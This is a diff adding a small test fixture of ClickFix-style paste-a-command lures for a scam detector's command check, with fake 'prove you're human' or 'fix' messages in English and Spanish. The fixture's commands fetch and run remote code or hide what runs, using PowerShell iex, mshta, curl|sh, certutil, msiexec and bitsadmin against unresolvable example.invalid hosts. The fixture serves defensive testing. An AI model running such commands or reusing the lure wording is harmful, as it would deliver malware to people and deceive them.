@@ -1,0 +1,62 @@
+# Paste-a-command tricks (ClickFix), for the command check's tests (Scam Shield 3.3). Every address is under
+# example.invalid, which can never resolve, and no command here does anything: each one names a download that can't
+# happen. Kept deliberately small: one or two of each publicly documented shape (Microsoft's ClickFix analysis, the
+# Huntress and "ClaudeFix" reports), never the disguise tricks real ones add. The check must find every one.
+# Each entry: a label line, "copied:" (what the person copies), "around:" (the message it was copied from).
+# Labels: [lure: download] (fetches and runs something) or [lure: hidden] (hides what it runs).
+---
+[lure: download]
+copied: powershell -c "iwr https://verify.example.invalid/check | iex"
+around: To prove you're not a robot, press Win+R, paste with Ctrl+V and press Enter.
+---
+[lure: download]
+copied: powershell -ExecutionPolicy Bypass -c "irm https://update.example.invalid/fix.ps1 | iex"
+around: Your session hit an error. Fix it: press the Windows key + R, paste the line below and press Enter.
+---
+[lure: download]
+copied: mshta https://captcha.example.invalid/verify.hta
+around: Verification step: open the Run box (Win+R), paste and press Enter, then come back to this chat.
+---
+[lure: download]
+copied: curl -fsSL https://support.example.invalid/install.sh | sh
+around: Shared by Apple Support. To finish the repair, open Terminal, paste this and press Return.
+---
+[lure: download]
+copied: certutil -urlcache -f https://files.example.invalid/tool.exe tool.exe
+around: I'm not a robot: press Win+R, paste the code, press Enter to continue.
+---
+[lure: download]
+copied: msiexec /i https://pkg.example.invalid/helper.msi /quiet
+around: Complete the CAPTCHA by pressing Windows key + R, then Ctrl+V and Enter.
+---
+[lure: download]
+copied: powershell -c "(New-Object Net.WebClient).DownloadString('https://cdn.example.invalid/a') | iex"
+around: Prove you're human: Win+R, paste, Enter. It takes two seconds.
+---
+[lure: hidden]
+copied: powershell -WindowStyle Hidden -c "Write-Output 'placeholder'"
+around: To unlock the full answer, press Win+R and paste this line, then press Enter.
+---
+[lure: hidden]
+copied: powershell -w hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHAAbABhAGMAZQBoAG8AbABkAGUAcgAnAA==
+around: Paste this in the Run dialog to verify you are human.
+---
+[lure: hidden]
+copied: echo cGxhY2Vob2xkZXIK | base64 -D | zsh
+around: Shared by Apple Support. Open Terminal and paste this to fix your Mac.
+---
+[lure: download]
+copied: powershell -c "iwr https://verifica.example.invalid/c | iex"
+around: Para demostrar que no eres un robot, pulsa la tecla de Windows + R, pégalo y pulsa Intro.
+---
+[lure: download]
+copied: mshta https://comprobar.example.invalid/v.hta
+around: Paso de verificación: abre Ejecutar (tecla de Windows + R), pega y pulsa Intro.
+---
+[lure: hidden]
+copied: powershell -WindowStyle Hidden -c "Write-Output 'marcador'"
+around: Verifica que eres humano: pulsa Windows + R, pega con Ctrl+V y pulsa Intro.
+---
+[lure: download]
+copied: bitsadmin /transfer job https://dl.example.invalid/x.exe C:\Users\Public\x.exe
+around: The chat can't load. Press Win+R, paste, Enter, then refresh.
